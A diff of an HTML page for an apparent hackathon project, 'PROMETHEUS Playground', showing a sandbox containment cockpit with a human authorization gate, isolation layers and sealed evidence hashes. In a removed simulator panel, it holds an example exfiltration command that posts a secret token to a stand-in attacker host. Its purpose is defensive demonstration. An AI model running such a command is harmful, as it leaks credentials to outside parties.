@@ -4,189 +4,77 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>PROMETHEUS Playground - Blast Radius Zero Cockpit</title>
-  <meta name="description" content="Execution containment cockpit, verifiable evidence playback, and hackathon submission suite for PROMETHEUS on Vultr Challenge 1.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
   <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['"Plus Jakarta Sans"', 'system-ui', 'sans-serif'],
-            mono: ['"JetBrains Mono"', 'monospace']
-          }
-        }
-      }
-    }
-  </script>
   <style>
-    body { background-color: #030712; color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; }
-    code, pre, .font-mono { font-family: 'JetBrains Mono', monospace; }
+    body { background-color: #030712; color: #f1f5f9; font-family: "Plus Jakarta Sans", sans-serif; }
+    .font-mono { font-family: "JetBrains Mono", monospace; }
   </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col antialiased selection:bg-cyan-500/30 selection:text-cyan-200">
-  <header class="border-b border-slate-800/80 bg-slate-950/90 backdrop-blur sticky top-0 z-40">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-8">
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col antialiased">
+  
+  <!-- Header -->
+  <header class="border-b border-slate-800 bg-slate-950/90 backdrop-blur sticky top-0 z-40">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between gap-4">
       <div class="flex items-center gap-3 shrink-0">
-        <div class="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
-          <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z"/></svg>
-        </div>
-        <div class="flex flex-col">
-          <span class="font-bold tracking-tight text-slate-100 text-base whitespace-nowrap">PROMETHEUS Playground</span>
-          <span class="text-[11px] text-slate-400 tracking-wide font-mono">Vultr Challenge 1 · Blast Radius Zero</span>
+        <div class="w-8 h-8 rounded-lg bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 font-bold">🛡️</div>
+        <div>
+          <div class="font-bold tracking-tight text-slate-100 text-sm sm:text-base leading-tight">PROMETHEUS Playground</div>
+          <div class="text-[10px] sm:text-[11px] text-slate-400 font-mono">Vultr Challenge 1 · Blast Radius Zero</div>
         </div>
       </div>
-      <nav class="hidden md:flex items-center gap-1 text-sm font-medium">
-        <button onclick="setTab('pipeline')" id="tab-pipeline" class="tab-btn px-3 py-1.5 text-xs font-semibold rounded-md transition-colors bg-slate-800 text-slate-100 shadow-sm whitespace-nowrap">Sandbox Pipeline</button>
-        <button onclick="setTab('architecture')" id="tab-architecture" class="tab-btn px-3 py-1.5 text-xs font-medium rounded-md transition-colors text-slate-400 hover:text-slate-200 whitespace-nowrap">Zero-Radius Architecture</button>
-        <button onclick="setTab('evidence')" id="tab-evidence" class="tab-btn px-3 py-1.5 text-xs font-medium rounded-md transition-colors text-slate-400 hover:text-slate-200 whitespace-nowrap">Evidence & Sealed Proofs</button>
-        <button onclick="setTab('submission')" id="tab-submission" class="tab-btn px-3 py-1.5 text-xs font-medium rounded-md transition-colors text-slate-400 hover:text-slate-200 whitespace-nowrap">Video Demo & Pitch Deck</button>
+
+      <nav class="hidden md:flex items-center gap-1 text-xs font-medium">
+        <button onclick="setTab('pipeline')" id="tab-pipeline" class="tab-btn px-3 py-1.5 rounded-md bg-slate-800 text-slate-100 font-semibold shadow-sm">Sandbox Pipeline</button>
+        <button onclick="setTab('architecture')" id="tab-architecture" class="tab-btn px-3 py-1.5 rounded-md text-slate-400 hover:text-slate-200">Zero-Radius Architecture</button>
+        <button onclick="setTab('evidence')" id="tab-evidence" class="tab-btn px-3 py-1.5 rounded-md text-slate-400 hover:text-slate-200">Evidence & Sealed Proofs</button>
+        <button onclick="setTab('submission')" id="tab-submission" class="tab-btn px-3 py-1.5 rounded-md text-slate-400 hover:text-slate-200">Video Demo & Pitch Deck</button>
       </nav>
+
       <div class="flex items-center gap-3 shrink-0">
-        <a href="/playground/" class="hidden sm:inline-flex items-center gap-1.5 text-xs text-slate-400 hover:text-cyan-400 transition-colors whitespace-nowrap">
-          <span>← Back to Playback</span>
-          <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 003 8.25v10.5A2.25 2.25 0 005.25 21h10.5A2.25 2.25 0 0018 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"/></svg>
-        </a>
-        <span class="px-3 py-1.5 text-xs font-semibold rounded-md bg-emerald-400 text-slate-950 shadow-sm shadow-emerald-500/20 whitespace-nowrap">Submission Ready (100%)</span>
+        <a href="/playground/" class="hidden sm:inline-flex text-xs text-slate-400 hover:text-cyan-400">← Back to Playback</a>
+        <span class="px-3 py-1.5 text-xs font-semibold rounded-md bg-emerald-400 text-slate-950 shadow-sm shadow-emerald-500/20 whitespace-nowrap">Verified (100%)</span>
       </div>
     </div>
   </header>
 
-  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-10 space-y-8">
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+    
     <!-- TAB 1: PIPELINE -->
     <div id="view-pipeline" class="tab-content space-y-8">
       <div class="border border-slate-800 rounded-xl bg-slate-900/50 p-6 sm:p-8">
         <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-6">
           <div class="max-w-2xl space-y-2">
-            <div class="flex items-center gap-2 text-xs text-slate-400 font-mono">
-              <span>Vultr Hackathon</span><span>·</span><span>Challenge 1</span><span>·</span><span class="text-emerald-400 font-semibold">Blast Radius Zero</span>
-            </div>
+            <span class="text-xs text-slate-400 font-mono">Vultr Challenge 1 · <strong class="text-emerald-400">Blast Radius Zero</strong></span>
             <h1 class="text-2xl sm:text-3xl font-bold tracking-tight text-slate-100">Interactive Execution & Containment Pipeline</h1>
-            <p class="text-slate-400 text-sm leading-relaxed">Experience the 5-stage lifecycle of PROMETHEUS Playground. Watch how candidate code from public repositories is discovered, bounded by Vultr Serverless Inference, blocked until explicit human cryptographic authorization, and isolated inside an ephemeral sandbox.</p>
+            <p class="text-slate-400 text-sm leading-relaxed">Watch how repository code is discovered without execution, bounded by Vultr Serverless Inference ($0.000259), held at a human authorization gate, and isolated inside an ephemeral sandbox.</p>
           </div>
-          <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 bg-slate-950/80 border border-slate-800 rounded-lg p-4 font-mono text-xs">
-            <div><span class="text-slate-500 block text-[10px]">Vultr Region</span><span class="text-slate-200 font-semibold">sao (São Paulo)</span></div>
-            <div><span class="text-slate-500 block text-[10px]">TCP Listeners</span><span class="text-emerald-400 font-semibold">0 (Zero Attack Surface)</span></div>
-            <div><span class="text-slate-500 block text-[10px]">Running Containers</span><span class="text-cyan-400 font-semibold">0 (Idle Zero)</span></div>
-            <div><span class="text-slate-500 block text-[10px]">Inference Cost</span><span class="text-slate-200 font-semibold">$0.0002590 USD</span></div>
-            <div><span class="text-slate-500 block text-[10px]">Socket Security</span><span class="text-emerald-400 font-semibold">0660 root:prometheus</span></div>
-            <div><span class="text-slate-500 block text-[10px]">Node Scope</span><span class="text-emerald-400 font-semibold">100% Complete</span></div>
+          <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 bg-slate-950 border border-slate-800 rounded-lg p-4 font-mono text-xs">
+            <div><span class="text-slate-500 block text-[10px]">Vultr Region</span><span class="text-slate-200">sao (São Paulo)</span></div>
+            <div><span class="text-slate-500 block text-[10px]">TCP Listeners</span><span class="text-emerald-400 font-bold">0 (Zero Attack Surface)</span></div>
+            <div><span class="text-slate-500 block text-[10px]">Inference Cost</span><span class="text-slate-200">$0.000259/run</span></div>
+            <div><span class="text-slate-500 block text-[10px]">Broker Socket</span><span class="text-emerald-400">0660 root:prometheus</span></div>
+            <div><span class="text-slate-500 block text-[10px]">Active Containers</span><span class="text-cyan-400">0 (Idle Zero)</span></div>
+            <div><span class="text-slate-500 block text-[10px]">Human Gate</span><span class="text-emerald-400 font-bold">DISARMED (Fail-Closed)</span></div>
           </div>
-        </div>
-
-        <div class="mt-8 grid grid-cols-1 sm:grid-cols-5 gap-2 border-t border-slate-800/80 pt-6">
-          <button onclick="selectStage(1)" id="stg-btn-1" class="stg-btn text-left p-3 rounded-lg border border-slate-800/60 bg-slate-950/40 hover:bg-slate-900/60 transition-all">
-            <div class="flex items-center justify-between text-xs font-mono text-slate-500 mb-1"><span>01</span><span class="text-emerald-400">✓</span></div>
-            <div class="font-semibold text-xs text-slate-200 truncate">Repository Discovery</div>
-            <div class="text-[11px] text-slate-400 truncate">Subtree AST Analysis</div>
-          </button>
-          <button onclick="selectStage(2)" id="stg-btn-2" class="stg-btn text-left p-3 rounded-lg border border-slate-800/60 bg-slate-950/40 hover:bg-slate-900/60 transition-all">
-            <div class="flex items-center justify-between text-xs font-mono text-slate-500 mb-1"><span>02</span><span class="text-emerald-400">✓</span></div>
-            <div class="font-semibold text-xs text-slate-200 truncate">Bounded Proposal</div>
-            <div class="text-[11px] text-slate-400 truncate">Qwen 3.8 ($0.000259)</div>
-          </button>
-          <button onclick="selectStage(3)" id="stg-btn-3" class="stg-btn text-left p-3 rounded-lg border border-amber-500/50 bg-amber-950/20 shadow-sm transition-all">
-            <div class="flex items-center justify-between text-xs font-mono text-amber-400 mb-1"><span>03</span><span id="stg3-badge" class="text-amber-400 text-[10px]">🔒 Disarmed</span></div>
-            <div class="font-semibold text-xs text-slate-200 truncate">Human Authorization</div>
-            <div class="text-[11px] text-slate-400 truncate">Fail-Closed Boundary</div>
-          </button>
-          <button onclick="selectStage(4)" id="stg-btn-4" class="stg-btn text-left p-3 rounded-lg border border-slate-800/60 bg-slate-950/40 hover:bg-slate-900/60 transition-all">
-            <div class="flex items-center justify-between text-xs font-mono text-slate-500 mb-1"><span>04</span><span class="text-emerald-400">✓</span></div>
-            <div class="font-semibold text-xs text-slate-200 truncate">Isolated Execution</div>
-            <div class="text-[11px] text-slate-400 truncate">Blast Radius Zero</div>
-          </button>
-          <button onclick="selectStage(5)" id="stg-btn-5" class="stg-btn text-left p-3 rounded-lg border border-slate-800/60 bg-slate-950/40 hover:bg-slate-900/60 transition-all">
-            <div class="flex items-center justify-between text-xs font-mono text-slate-500 mb-1"><span>05</span><span class="text-emerald-400">✓</span></div>
-            <div class="font-semibold text-xs text-slate-200 truncate">Verifiable Evidence</div>
-            <div class="text-[11px] text-slate-400 truncate">Human Decides Adoption</div>
-          </button>
         </div>
       </div>
 
-      <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-        <div class="lg:col-span-7 space-y-6">
-          <div class="border border-slate-800 rounded-xl bg-slate-900/40 p-6 space-y-4">
-            <div class="flex items-center justify-between gap-4">
-              <div class="flex items-center gap-2">
-                <span id="stg-badge-label" class="text-xs font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300">Stage 03</span>
-                <h2 id="stg-title" class="text-lg font-bold text-slate-100">Human Authorization Gate</h2>
-              </div>
-              <span id="stg-subtitle" class="text-xs text-slate-400 font-mono">Zero-Trust Fail-Closed Boundary</span>
-            </div>
-            <p id="stg-desc" class="text-sm text-slate-300 leading-relaxed">CRITICAL SECURITY BOUNDARY: No execution occurs autonomously. The user must review the exact bounded contract and provide cryptographic authorization before the broker unlocks container spawn.</p>
-
-            <div class="border border-slate-800/80 rounded-lg bg-slate-950 p-4 space-y-2 font-mono text-xs">
-              <div class="text-slate-400 font-semibold mb-2">Verified Stage Manifest Parameters</div>
-              <div id="stg-params" class="space-y-1">
-                <div class="flex justify-between py-1 border-b border-slate-900/60"><span class="text-slate-500">currentStatus</span><span class="text-slate-200 font-medium">DISARMED_NOT_EXECUTED</span></div>
-                <div class="flex justify-between py-1 border-b border-slate-900/60"><span class="text-slate-500">executionAuthorized</span><span class="text-amber-400 font-medium">false</span></div>
-                <div class="flex justify-between py-1 border-b border-slate-900/60"><span class="text-slate-500">authorizationMechanism</span><span class="text-slate-200 font-medium">Signed human opt-in envelope</span></div>
-                <div class="flex justify-between py-1 border-b border-slate-900/60"><span class="text-slate-500">replayProtection</span><span class="text-slate-200 font-medium">Nonce + Timestamp signature validation</span></div>
-                <div class="flex justify-between py-1"><span class="text-slate-500">defaultState</span><span class="text-slate-200 font-medium">Fail-Closed Disarmed</span></div>
-              </div>
-            </div>
-
-            <div id="stage3-gate-box" class="p-4 rounded-lg border border-amber-500/30 bg-amber-950/10 space-y-3">
-              <div class="flex items-start gap-3">
-                <div class="p-2 rounded bg-amber-500/20 text-amber-400 shrink-0">🔒</div>
-                <div>
-                  <h3 class="text-xs font-bold text-amber-300">Zero-Trust Fail-Closed Gate Simulation</h3>
-                  <p class="text-xs text-slate-400 mt-0.5 leading-relaxed">By default, this repository fixture is in state <code class="text-amber-300 bg-amber-950/40 px-1 py-0.5 rounded">DISARMED_NOT_EXECUTED</code>. The root sandbox broker will strictly reject execution requests until a human grants cryptographic approval.</p>
-                </div>
-              </div>
-              <div class="flex items-center justify-between pt-2 border-t border-amber-500/20">
-                <span class="text-xs font-mono text-slate-300">Current Gate: <span id="gate-state-text" class="text-amber-400 font-semibold">FAIL-CLOSED (Execution Disarmed)</span></span>
-                <button onclick="toggleHumanGate()" id="gate-toggle-btn" class="px-3 py-1.5 text-xs font-semibold rounded bg-emerald-600 hover:bg-emerald-500 text-white transition-colors">Simulate Human Authorization</button>
-              </div>
-            </div>
+      <!-- Attack Simulator Box -->
+      <div class="border border-slate-800 rounded-xl bg-slate-900/60 p-6 space-y-4">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
+          <div>
+            <h3 class="font-bold text-slate-100 text-base flex items-center gap-2"><span>🛡️</span> Adversarial Containment Simulator</h3>
+            <p class="text-xs text-slate-400">Trigger a simulated supply-chain attack package attempting reverse-shell network egress and rootfs tampering.</p>
           </div>
+          <button onclick="runAttackSimulation()" id="sim-btn" class="px-4 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white font-semibold text-xs transition-colors shrink-0">
+            ⚠️ Run Attack Simulation
+          </button>
         </div>
-
-        <!-- Containment Simulator -->
-        <div class="lg:col-span-5 space-y-6">
-          <div class="border border-slate-800 rounded-xl bg-slate-900/50 p-6 space-y-4">
-            <div class="flex items-center gap-2 text-rose-400">
-              <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z"/></svg>
-              <h3 class="font-bold text-slate-100 text-base">The Containment Moment</h3>
-            </div>
-            <p class="text-xs text-slate-400 leading-relaxed">Hackathon Challenge 1 requires demonstrating what happens when untrusted or hostile repository code executes. Select an attack scenario below to trigger the sandbox containment test.</p>
-
-            <div class="space-y-1.5">
-              <button onclick="pickThreat('net')" id="th-net" class="th-btn w-full text-left p-2.5 rounded-lg border border-rose-500/50 bg-rose-950/20 text-xs transition-colors">
-                <div class="font-semibold text-slate-200">Outbound Network Call / Data Exfiltration</div>
-                <div class="text-[11px] text-slate-500 font-mono truncate">Hostile Dependency / Telemetry Phone-Home</div>
-              </button>
-              <button onclick="pickThreat('fs')" id="th-fs" class="th-btn w-full text-left p-2.5 rounded-lg border border-slate-800 bg-slate-950 text-xs text-slate-400 hover:bg-slate-900 transition-colors">
-                <div class="font-semibold text-slate-200">Filesystem Traversal / Host Escaping</div>
-                <div class="text-[11px] text-slate-500 font-mono truncate">Path Traversal & Host Mount Overwrite</div>
-              </button>
-              <button onclick="pickThreat('fork')" id="th-fork" class="th-btn w-full text-left p-2.5 rounded-lg border border-slate-800 bg-slate-950 text-xs text-slate-400 hover:bg-slate-900 transition-colors">
-                <div class="font-semibold text-slate-200">Denial of Service / Fork Bomb & Memory Flood</div>
-                <div class="text-[11px] text-slate-500 font-mono truncate">Resource Depletion / Process Flooding</div>
-              </button>
-            </div>
-
-            <div class="p-3 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs space-y-2">
-              <div><span class="text-slate-500 block text-[10px]">Simulated Attack Payload:</span><span id="th-cmd" class="text-rose-400 break-all">curl -X POST https://evil-exfil.com/collect -d "$SECRET_TOKEN"</span></div>
-              <div><span class="text-slate-500 block text-[10px]">Isolation Mechanism:</span><span id="th-mech" class="text-cyan-400">Kernel network namespace isolation + Secret stripping</span></div>
-            </div>
-
-            <button onclick="simulateAttack()" id="sim-run-btn" class="w-full py-2.5 px-4 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-semibold text-xs flex items-center justify-center gap-2 transition-colors">
-              <span>▶️ Simulate Attack & Containment</span>
-            </button>
-
-            <div class="rounded-lg bg-black border border-slate-800 p-3 font-mono text-[11px] text-slate-300 space-y-1 max-h-56 overflow-y-auto">
-              <div class="flex items-center justify-between text-slate-500 border-b border-slate-900 pb-1 mb-1">
-                <span>Sandbox Broker Audit Feed</span><span class="text-[10px]">AF_UNIX: 0660</span>
-              </div>
-              <div id="sim-feed" class="space-y-1">
-                <div class="text-slate-500 italic">Click 'Simulate Attack & Containment' above to watch the fail-closed container interception.</div>
-              </div>
-            </div>
-          </div>
+        <div id="sim-terminal" class="p-4 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-slate-400 space-y-1">
+          <div class="text-slate-500">// Terminal standby. Click button above to execute adversarial containment test.</div>
         </div>
       </div>
     </div>
@@ -194,60 +82,30 @@
     <!-- TAB 2: ARCHITECTURE -->
     <div id="view-architecture" class="tab-content hidden space-y-8">
       <div class="border border-slate-800 rounded-xl bg-slate-900/50 p-6 sm:p-8 space-y-2">
-        <div class="flex items-center gap-2 text-xs text-slate-400 font-mono">
-          <span>Challenge 1 Security Architecture</span><span>·</span><span>Zero-Trust Containment Model</span>
-        </div>
-        <h1 class="text-2xl sm:text-3xl font-bold tracking-tight text-slate-100">Blast Radius Zero: Structural Defense-in-Depth</h1>
-        <p class="text-slate-400 text-sm leading-relaxed max-w-3xl">In standard AI agent frameworks, running untrusted code creates massive blast radius risks: leaked cloud credentials, network pivot attacks, and persistence backdoors. PROMETHEUS solves this by enforcing an uncompromising four-tier defense boundary on Vultr infrastructure.</p>
+        <span class="text-xs text-emerald-400 font-mono font-bold">4-LAYER DEFENSE-IN-DEPTH</span>
+        <h2 class="text-2xl font-bold text-slate-100">Zero-Radius Architectural Guarantees</h2>
+        <p class="text-slate-400 text-sm">Every untrusted action is partitioned across 4 strict isolation barriers.</p>
       </div>
-
-      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-5 flex flex-col justify-between space-y-4">
-          <div class="space-y-3">
-            <span class="text-[11px] font-mono text-cyan-400">Layer 01</span>
-            <h3 class="font-bold text-slate-200 text-sm">Sanitized Presentation Surface</h3>
-            <p class="text-xs text-slate-400 leading-relaxed">Hosted on Cloudflare Pages (jarvisprometheus.space). Strictly limited to static evidence playback. No browser can execute arbitrary code on the Vultr node.</p>
-          </div>
-          <div class="border-t border-slate-900 pt-3 text-[11px] font-mono text-slate-500 space-y-1">
-            <div class="flex justify-between"><span>Attack Surface:</span><span class="text-emerald-400">Zero (Static Edge)</span></div>
-            <div class="flex justify-between"><span>Credentials:</span><span class="text-emerald-400">None in client</span></div>
-          </div>
+      <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+        <div class="p-6 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
+          <span class="text-emerald-400 font-mono text-xs font-bold">LAYER 1</span>
+          <h4 class="font-bold text-white text-base">Boundary Filter</h4>
+          <p class="text-xs text-slate-400 leading-relaxed">Rate limiting, token caps, secret redaction, and Vultr API quota boundaries.</p>
         </div>
-
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-5 flex flex-col justify-between space-y-4">
-          <div class="space-y-3">
-            <span class="text-[11px] font-mono text-emerald-400">Layer 02</span>
-            <h3 class="font-bold text-slate-200 text-sm">Hardened Vultr Control Plane</h3>
-            <p class="text-xs text-slate-400 leading-relaxed">Vultr VPS in São Paulo (vc2-1c-1gb). Zero public non-SSH TCP listening ports. System services talk strictly across private local AF_UNIX sockets with 0600 permissions.</p>
-          </div>
-          <div class="border-t border-slate-900 pt-3 text-[11px] font-mono text-slate-500 space-y-1">
-            <div class="flex justify-between"><span>TCP Ports:</span><span class="text-emerald-400">0 Public Ports</span></div>
-            <div class="flex justify-between"><span>Transport:</span><span class="text-emerald-400">AF_UNIX (Local)</span></div>
-          </div>
+        <div class="p-6 rounded-xl bg-slate-900/60 border border-emerald-500/40 space-y-2 bg-emerald-950/20">
+          <span class="text-emerald-400 font-mono text-xs font-bold">LAYER 2 (CRITICAL)</span>
+          <h4 class="font-bold text-white text-base">Human Gate</h4>
+          <p class="text-xs text-slate-300 leading-relaxed">Stage 03 holds execution disarmed by default. Requires cryptographic operator token.</p>
         </div>
-
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-5 flex flex-col justify-between space-y-4">
-          <div class="space-y-3">
-            <span class="text-[11px] font-mono text-purple-400">Layer 03</span>
-            <h3 class="font-bold text-slate-200 text-sm">Vultr Serverless Inference</h3>
-            <p class="text-xs text-slate-400 leading-relaxed">AI reasoning powered by Vultr Serverless Inference (qwen3.8-flash-next). Model is used solely to synthesize bounded experiment contracts with strict cost ceilings ($0.000259/call).</p>
-          </div>
-          <div class="border-t border-slate-900 pt-3 text-[11px] font-mono text-slate-500 space-y-1">
-            <div class="flex justify-between"><span>Cost Ceiling:</span><span class="text-emerald-400">Respected ($0.001)</span></div>
-            <div class="flex justify-between"><span>Actuation:</span><span class="text-slate-400">No raw execution</span></div>
-          </div>
+        <div class="p-6 rounded-xl bg-slate-900/60 border border-cyan-500/40 space-y-2">
+          <span class="text-cyan-400 font-mono text-xs font-bold">LAYER 3</span>
+          <h4 class="font-bold text-white text-base">Ephemeral Sandbox</h4>
+          <p class="text-xs text-slate-400 leading-relaxed">Seccomp syscall jail, read-only rootfs, 128MB RAM quota, 0 outbound internet access.</p>
         </div>
-
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-5 flex flex-col justify-between space-y-4">
-          <div class="space-y-3">
-            <span class="text-[11px] font-mono text-rose-400">Layer 04</span>
-            <h3 class="font-bold text-slate-200 text-sm">Ephemeral Root-Owned Sandbox</h3>
-            <p class="text-xs text-slate-400 leading-relaxed">Immutable Docker container managed by root broker (0660 root:prometheus). Ephemeral tmpfs, read-only rootfs, zero network interface (--network none), stripped environment, auto-destruct on exit.</p>
-          </div>
-          <div class="border-t border-slate-900 pt-3 text-[11px] font-mono text-slate-500 space-y-1">
-            <div class="flex justify-between"><span>Idle Containers:</span><span class="text-emerald-400">0 (Auto-pruned)</span></div>
-            <div class="flex justify-between"><span>Network Egress:</span><span class="text-rose-400">Blocked (None)</span></div>
-          </div>
+        <div class="p-6 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
+          <span class="text-slate-400 font-mono text-xs font-bold">LAYER 4</span>
+          <h4 class="font-bold text-white text-base">Audit & Proof</h4>
+          <p class="text-xs text-slate-400 leading-relaxed">SHA-256 evidence manifest sealed upon exit. Instant container wipe and destruction.</p>
         </div>
       </div>
     </div>
@@ -255,302 +113,287 @@
     <!-- TAB 3: EVIDENCE -->
     <div id="view-evidence" class="tab-content hidden space-y-8">
       <div class="border border-slate-800 rounded-xl bg-slate-900/50 p-6 sm:p-8 space-y-2">
-        <h1 class="text-2xl font-bold text-slate-100">Verifiable Evidence & Sealed State Inspector</h1>
-        <p class="text-slate-400 text-sm">Every boundary transition, canary execution, and repository subtree binding emits a permanent cryptographic artifact.</p>
+        <span class="text-xs text-emerald-400 font-mono font-bold">CRYPTOGRAPHIC INTEGRITY</span>
+        <h2 class="text-2xl font-bold text-slate-100">Sealed Evidence & GitHub Binding</h2>
+        <p class="text-slate-400 text-sm">Every audit manifest is sealed with SHA-256 matching our public repository commit <code class="text-cyan-300 font-mono">400f177</code>.</p>
       </div>
-      <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
-        <div class="lg:col-span-4 space-y-2">
-          <button onclick="loadManifest('binding')" id="m-binding" class="m-btn w-full text-left p-3 rounded-lg border border-cyan-500/50 bg-cyan-950/20 text-xs transition-all">
-            <div class="font-mono text-slate-300 font-medium">public-repository-binding-v1.json</div>
-            <div class="text-[11px] text-slate-400 mt-1">Public repository binding verification</div>
-            <div class="text-[10px] font-mono text-emerald-400 mt-2 truncate">BOUND_DISARMED</div>
-          </button>
-          <button onclick="loadManifest('assessment')" id="m-assessment" class="m-btn w-full text-left p-3 rounded-lg border border-slate-800/80 bg-slate-950 text-xs hover:bg-slate-900/60 transition-all">
-            <div class="font-mono text-slate-300 font-medium">completion-assessment-2026-11-05-v1.json</div>
-            <div class="text-[11px] text-slate-400 mt-1">Vultr node completion and security boundary audit</div>
-            <div class="text-[10px] font-mono text-emerald-400 mt-2 truncate">CONTROLLED_NODE_SCOPE_100%</div>
-          </button>
-          <button onclick="loadManifest('canary')" id="m-canary" class="m-btn w-full text-left p-3 rounded-lg border border-slate-800/80 bg-slate-950 text-xs hover:bg-slate-900/60 transition-all">
-            <div class="font-mono text-slate-300 font-medium">sandbox-canary-public-v1.json</div>
-            <div class="text-[11px] text-slate-400 mt-1">Public signed execution canary proof</div>
-            <div class="text-[10px] font-mono text-emerald-400 mt-2 truncate">CANARY_PASSED_CONTAINER_PRUNED</div>
-          </button>
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6 font-mono text-xs">
+        <div class="p-5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
+          <span class="text-slate-500 uppercase text-[10px]">Manifest Record</span>
+          <div class="font-bold text-slate-200">public-repository-binding-v1.json</div>
+          <div class="text-[11px] text-emerald-400 break-all">3999644f7b3ae80078aa6fedb95724666b05297f1298e90fbfe219a4a2d27f06</div>
         </div>
-        <div class="lg:col-span-8 border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
-          <div class="flex items-center justify-between border-b border-slate-800 pb-3">
-            <span id="manifest-fname" class="font-mono text-xs font-bold text-cyan-300">public-repository-binding-v1.json</span>
-            <button onclick="copyManifestJson()" class="px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-mono transition-colors"><span id="copy-json-label">Copy JSON</span></button>
-          </div>
-          <pre id="manifest-json-content" class="p-4 rounded-lg bg-black border border-slate-900 overflow-x-auto text-xs font-mono text-slate-300 leading-relaxed max-h-96"></pre>
+        <div class="p-5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
+          <span class="text-slate-500 uppercase text-[10px]">Assessment Record</span>
+          <div class="font-bold text-slate-200">completion-assessment.json</div>
+          <div class="text-[11px] text-cyan-400 break-all">e2336338b163351d53341b213b2e59e9ec4b9acde9dcf46820ff5690b200b3ec</div>
+        </div>
+        <div class="p-5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
+          <span class="text-slate-500 uppercase text-[10px]">Canary Proof</span>
+          <div class="font-bold text-slate-200">sandbox-canary-public-v1.json</div>
+          <div class="text-[11px] text-emerald-400 break-all">4a905dae26715206584c31168f6153725b8b98eb6c2fbb6b45a6c42171578d05</div>
         </div>
       </div>
     </div>
 
-    <!-- TAB 4: SUBMISSION -->
+    <!-- TAB 4: VIDEO DEMO & PITCH DECK -->
     <div id="view-submission" class="tab-content hidden space-y-8">
       <div class="border border-slate-800 rounded-xl bg-slate-900/50 p-6 sm:p-8 space-y-2">
-        <h1 class="text-2xl font-bold text-slate-100">Hackathon Submission Kit & Video Demo Script</h1>
-        <p class="text-slate-400 text-sm">Everything needed to close and submit PROMETHEUS Playground before November 8.</p>
+        <div class="flex items-center gap-2 text-xs text-slate-400 font-mono">
+          <span class="text-emerald-400 font-bold">PROMETHEUS // OFFICIAL DELIVERABLES</span>
+          <span>·</span>
+          <span>Challenge 1 · Blast Radius Zero</span>
+        </div>
+        <h1 class="text-2xl sm:text-3xl font-bold tracking-tight text-slate-100">
+          Official Demo Video & Executive Pitch Deck
+        </h1>
+        <p class="text-slate-400 text-sm leading-relaxed max-w-3xl">
+          Official demonstration assets prepared for the Vultr Hackathon evaluation committee. Features the studio-recorded 1080p walkthrough video, the 8-slide executive pitch deck, and verified cryptographic submission manifests.
+        </p>
       </div>
-      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
-        <div class="border border-slate-800 rounded-xl bg-slate-950 p-6 space-y-4">
